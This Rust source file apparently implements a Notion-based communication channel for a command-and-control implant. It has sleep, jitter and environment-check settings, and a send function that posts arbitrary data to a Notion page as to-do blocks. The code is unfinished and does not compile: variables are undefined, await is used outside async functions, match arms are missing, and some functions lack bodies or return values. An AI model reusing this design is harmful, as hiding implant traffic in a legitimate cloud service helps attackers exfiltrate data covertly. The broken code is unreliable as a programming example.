use crate::channels::{Channel, ChannelError, ChannelConfig};
use serde::{Serialize, Deserialize};
use base64::encode;
use reqwest::Client;
use serde_json::{json, from_value};

#[derive(Serialize, Deserialize)]
pub struct NotionConfig {
    pub api_key: String,
    pub parent_page_id: String,
    pub sleep_interval: u64,
    pub jitter_time: u64,
    pub launch_app: bool,
    pub log_level: u64,
    pub config_file_path: String,
    pub env_checks: Vec<EnvCheck>
}

pub struct NotionChannel {
    config: NotionConfig
}



impl Channel for NotionChannel {

    fn init(&self, config: ChannelConfig) -> Result<NotionChannel, ChannelError> {
        match from_value(config) {
            Ok(c) => NotionChannel { config: c }
        }
    }

    fn send(&self, data: String) -> Result<String, ChannelError> {
        let command: serde_json::Value = json!({
            "object": "block",
            "type": "to_do",
            "to_do": {
                "text": [
                    {
                        "text": {
                            "content": data
                        }
                    }
                ],
                "checked": false
            }
        });
        let url = format!("{URL_BASE}/blocks/children");
        let r = client
            .patch(url)
            .json(&command)
            .send()
            .await
            .unwrap();
        
        if !r.status().is_success() {
            let result_text = r.text().await.unwrap();
            // logger.debug(result_text);
        }
    }
    fn receive(&self) -> Result<String, ChannelError> {
        
    }

    /// Produces a base64 encoded String of the Options.
    ///
    /// This is useful for sending ConfigOptions to launch commands
    fn to_base64(&self) -> String {
        encode(to_string(self).unwrap().as_bytes())
    }
}

